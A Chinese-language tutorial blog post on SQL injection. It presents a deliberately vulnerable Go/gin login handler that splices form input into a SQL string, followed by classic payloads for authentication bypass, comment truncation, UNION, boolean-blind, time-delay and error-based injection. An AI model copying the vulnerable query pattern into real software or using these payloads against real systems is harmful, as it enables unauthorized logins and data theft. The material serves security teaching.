---
title: SQL Inject
createTime: 2025-1-27
author: ZQ
permalink: /network/webserver/sql/inject/
tags:
  - web
---

SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在应用程序的输入字段中插入恶意的SQL代码，来操控后台数据库，从而获取、篡改或删除数据。

<!-- more -->

##  原理

+ 输入验证不足：应用程序在处理用户输入时，没有对输入内容进行充分的验证和过滤，直接将用户输入拼接到SQL查询语句中。
+ 动态构造SQL语句：应用程序使用动态的方式构造SQL语句，将用户输入作为查询条件的一部分。
+ 执行恶意SQL代码：攻击者通过特制的输入，插入或修改SQL语句的结构，使其执行非预期的数据库操作。

## 实验

### `unsafe login`接口

使用`gin`启动一个`unsafe login` 接口，这里给出接口的实现。可以在[github](https://github.com/Zqzqsb/WebSecurityDemos/tree/main/SQL_Inject)查看完整示例。

```go
// Unsafe login method - vulnerable to SQL injection
func unsafeLogin(c *gin.Context) {
        username := c.PostForm("username")
        password := c.PostForm("password")

        // Simulate some delay for time-based injection detection
        if strings.Contains(strings.ToLower(username), "sleep") {
                time.Sleep(2 * time.Second)
        }

        // Dangerous: directly concatenating SQL statements
        var result map[string]interface{}
        // Changed the query format to make basic authentication bypass work
        sql := fmt.Sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", username, password)

        // Log the SQL query for demonstration
        log.Printf("Executing SQL: %s", sql)

        err := db.Raw(sql).Scan(&result).Error

        if err != nil {
                // Return error message for error-based injection demonstration
                c.JSON(http.StatusBadRequest, gin.H{
                        "message": fmt.Sprintf("Login failed with error: %v", err),
                })
                return
        }

        if len(result) > 0 {
                c.JSON(http.StatusOK, gin.H{
                        "message": "Login successful",
                        "user":    result,
                })
        } else {
                c.JSON(http.StatusUnauthorized, gin.H{
                        "message": "Login failed: Invalid credentials",
                })
        }
}
```


应用程序的登录查询如下：

```sql
SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码';
```


### 基础认证绕过

基础认证绕过是一种最简单的SQL注入攻击方式，攻击者通过构造特定的输入，使SQL查询条件始终为真，从而绕过身份验证。

当攻击者在用户名或密码字段中输入`' OR '1'='1`时，SQL语句变为：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

由于`'1'='1'`始终为真，整个WHERE条件成立，数据库将返回所有用户记录，通常会导致攻击者成功登录。

###  注释型注入

注释型

注入利用SQL的注释符号（如`--`）截断原有的SQL语句，忽略后续的条件，从而改变查询

攻击者在用户名字段输入`admin'--`，SQL语句变为：

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
```

这样，密码验证被绕过，攻击者以`admin`用户身份登录。

### UNION查询注入

UNION查询注入通过使用SQL的`UNION`操作符，将恶意查询的结果与原始查询结果合并，攻击者可以借此获取数据库中其他表或数据的信息。

```sql
SELECT id, username, password, role FROM users WHERE username = 'admin' UNION SELECT 1 as id, 'hacker' as username, 'pwned' as password, 'admin' as role --';
```

这将返回两条记录：一条是`admin`用户的真实记录，另一条是攻击者注入的虚假记录。攻击者可以利用这种方式获取敏感信息或提升权限。

### 布尔盲注

布尔盲注在应用程序不直接显示数据库错误信息时使用，攻击者通过构造不同的条件，观察应用程序响应的真假情况，逐步推断出数据库的信息。

假设应用程序根据SQL查询的结果显示不同的页面内容。攻击者输入`admin' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1`，SQL语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1';
```


###  时间延迟注入

攻击者输入`admin' AND (SELECT CASE WHEN (1=1) THEN sqlite3_sleep(2000) ELSE 1 END)='1`，SQL语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' AND (SELECT CASE WHEN (1=1) THEN sqlite3_sleep(2000) ELSE 1 END)='1';
```

### 报错注入

报错注入通过诱使数据库生成错误信息，攻击者可以利用这些错误信息获取数据库的结构和其他敏感信息。

假设应用程序在查询失败时会显示数据库错误信息。攻击者输入`admin' AND (SELECT CASE WHEN (1=1) THEN CAST('a' AS INTEGER) ELSE 1 END)='1`，SQL语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' AND (SELECT CASE WHEN (1=1) THEN CAST('a' AS INTEGER) ELSE 1 END)='1';
```

由于`CAST('a' AS INTEGER)`在SQL中会导致类型转换错误，数据库会返回错误信息。攻击者可以通过分析这些错误信息，了解数据库的结构和类型，进一步进行攻击。